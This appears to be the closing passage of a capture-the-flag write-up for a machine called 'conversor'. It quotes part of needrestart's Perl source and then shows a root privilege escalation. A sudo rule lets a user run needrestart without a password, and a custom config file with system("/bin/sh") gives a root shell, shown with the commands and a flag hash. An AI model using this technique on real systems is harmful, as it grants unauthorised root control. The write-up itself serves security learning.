                            print STDERR "$LOGPREF run $bin\n" if($nrconf{verbosity} > 1);
                            my $pipe = nr_fork_pipew($nrconf{verbosity} > 1, $bin);
                            print $pipe "$fnames\n";
                            last if(close($pipe));
                        }
                    }
                }
            }
        }
    }

        ## GUESTS
        $ui->vspace();
        if (! @guests) {
                $ui->notice(__ 'No VM guests are running outdated hypervisor (qemu) binaries on this host.') unless($opt_b || $opt_m eq 'e');
        }
        else {
                if($opt_m eq 'e') {
                        push(@easy_hints, __ 'outdated VM guests');
                }
                else {
                        unless($opt_p || $opt_b) {
                                $ui->notice(__ 'VM guests are running outdated hypervisor (qemu) binaries on this host:');
                                foreach ( @guests ) {
                                $ui->notice(" $_");
                                }
                        }
                }
        }
}

# easy mode: print hint on outdated stuff
if(scalar @easy_hints) {
    my $t = pop(@easy_hints);
    my $h = join(', ', @easy_hints);
    $ui->announce_ehint(EHINT => ($h ? join(' ', $h, __ 'and', '') : '') . $t);
}

my @sessions_list;
if(scalar %sessions) {
    # build a sorted list of user @ session strings
    #
    # used in the nagios and batch outputs below
    @sessions_list = map {
        my $uid = $_;
        my $user = uid2name($uid);
        my @ret;

        foreach my $sess (sort keys %{ $sessions{$uid} }) {
            push(@ret, "$user \@ $sess");
        }

        @ret;
    }
    sort {
        ncmp(uid2name($a), uid2name($b));
    } keys %sessions
}

# nagios plugin output
if($opt_p) {
    my %states = (
        0 => q(OK),
        1 => q(WARN),
        2 => q(CRIT),
        3 => q(UNKN),
        );
    my ($ret) = reverse sort
        (($opt_k ? $nagios{kret} : ()), ($opt_w ? $nagios{mret} : ()),
        ($opt_l ? ($nagios{sret}, $nagios{cret}, $nagios{uret}) : ()));

    print "$states{$ret} - ", join(', ',
               ($opt_k ? "Kernel: $nagios{kstr}" : ()),
               ($opt_w ? "Microcode: $nagios{mstr}" : ()),
               ($opt_l ? "Services: $nagios{sstr}" : ()),
               ($opt_l ? "Containers: $nagios{cstr}" : ()),
               ($opt_l ? "Sessions: $nagios{ustr}" : ()),
        ), '|', join(' ',
               ( ($opt_k && $nagios{kret} != 3) ? "Kernel=$nagios{kperf};0;;0;2" : ()),
               ( ($opt_w && $nagios{mret} != 3) ? "Microcode=$nagios{mperf};0;;0;1" : ()),
               ( ($opt_l && $nagios{sret} != 3) ? "Services=$nagios{sperf};;0;0" : ()),
               ( ($opt_l && $nagios{cret} != 3) ? "Containers=$nagios{cperf};;0;0" : ()),
               ( ($opt_l && $nagios{uret} != 3) ? "Sessions=$nagios{uperf};0;;0" : ()),
        ), "\n";

    if(scalar %restart) {
        print "Services:", join("\n- ", '', sort keys %restart), "\n";
    }

    my %conts = needrestart_cont_get($nrconf{verbosity} > 1);
    if(scalar %conts) {
        print "Containers:", join("\n- ", '', sort keys %conts), "\n";
    }

    if(scalar %sessions) {
        print "Sessions:", join("\n- ", '', @sessions_list), "\n";
    }

    exit $ret;
}
if ($opt_o) {
    print "# TYPE needrestart_build info\n";
    print "# HELP needrestart_build information about needrestart's runtime build\n";
    print "needrestart_build_info{version=$NeedRestart::VERSION,perl_version=$^V} 1\n";

    if ($opt_k) {
        my @ometric_kernel_status = map { $_ == $ometric_kernel_values{kresult} ? 1 : 0 } (NRK_NOUPGRADE, NRK_ABIUPGRADE, NRK_VERUPGRADE);
        print "# TYPE needrestart_kernel_status stateset\n";
        print "# HELP needrestart_kernel_status status of kernel as reported by needrestart\n";
        print "needrestart_kernel_status{needrestart_kernel_status=\"current\"} $ometric_kernel_status[0]\n";
        print "needrestart_kernel_status{needrestart_kernel_status=\"abi_upgrade\"} $ometric_kernel_status[1]\n";
        print "needrestart_kernel_status{needrestart_kernel_status=\"version_upgrade\"} $ometric_kernel_status[2]\n";
        print "# TYPE needrestart_kernel info\n";
        print "# HELP needrestart_kernel version information for currenly running and most up to date kernels\n";
        print "needrestart_kernel_info{running=\"$ometric_kernel_values{krunning}\",expected=\"$ometric_kernel_values{kexpected}\"} 1\n";
    }
    if ($opt_w) {
        my $ometric_ucode_current = $ucode_result != NRM_UNKNOWN ? $ucode_vars{CURRENT} : "unknown";
        my $ometric_ucode_expected = $ucode_result != NRM_UNKNOWN ? $ucode_vars{AVAIL} : "unknown";
        my @ometric_ucode_status = map { $_ == $ucode_result ? 1 : 0 } (NRM_CURRENT, NRM_OBSOLETE, NRM_UNKNOWN);
        print "# TYPE needrestart_ucode_status stateset\n";
        print "# HELP needrestart_ucode_status status of the host's CPU microcode as reported by needrestart\n";
        print "needrestart_ucode_status{needrestart_ucode_status=\"current\"} $ometric_ucode_status[0]\n";
        print "needrestart_ucode_status{needrestart_ucode_status=\"obsolete\"} $ometric_ucode_status[1]\n";
        print "needrestart_ucode_status{needrestart_ucode_status=\"unknown\"} $ometric_ucode_status[2]\n";
        print "# TYPE needrestart_ucode info\n";
        print "# HELP needrestart_ucode version informaion for currently used and available microcode\n";
        print "needrestart_ucode_info{running=\"$ometric_ucode_current\",expected=\"$ometric_ucode_expected\"} 1\n";
    }
    if ($opt_l) {
        my $ometric_num_services = scalar %restart;
        print "# TYPE needrestart_processes_with_outdated_libraries gauge\n";
        print "# HELP needrestart_processes_with_outdated_libraries number of processes requiring a restart\n";
        print "needrestart_processes_with_outdated_libraries $ometric_num_services\n";
    }
    print "# EOF\n";
    exit 0;
}

if ($opt_b and scalar %sessions) {
    for my $sess (@sessions_list) {
        print "NEEDRESTART-SESS: $sess\n";
    }
}
```

```
# slurp config file
print STDERR "$LOGPREF eval $opt_c\n" if($nrconf{verbosity} > 1);
eval do {
    local $/;
    open my $fh, $opt_c or die "ERROR: $!\n";
    my $cfg = <$fh>;
    close($fh);
    $cfg;
};
die "Error parsing $opt_c: $@" if($@);
```
First we find `fismathack` run **/usr/sbin/needrestart** as `sudo` without needing password
```
fismathack@conversor:/home$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Reviewing the --help menu, we find `needrestart accepts -c <cfg>`, 
```
fismathack@conversor:~$ sudo /usr/sbin/needrestart -h
Unknown option: h
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```
so went for it source code and find that it evals the entire config file as Perl code. 
```
# slurp config file
print STDERR "$LOGPREF eval $opt_c\n" if($nrconf{verbosity} > 1);
eval do {
    local $/;
    open my $fh, $opt_c or die "ERROR: $!\n";
    my $cfg = <$fh>;
    close($fh);
    $cfg;
};
die "Error parsing $opt_c: $@" if($@);
```
Because `needrestart` can be run with **sudo** and lets you load a custom config, **anything** inside that config gets **executed as root**. So we just create a fake config that runs a shell and pass it with `-c`.

## Shell as root
```
fismathack@conversor:/home$ echo 'system("/bin/sh");' > /tmp/nr.conf
fismathack@conversor:/home$ sudo /usr/sbin/needrestart -c /tmp/nr.conf
# whoami
root
# cat /root/root.txt
04e4e9de8223960fd3b2fab4764e26b1
```
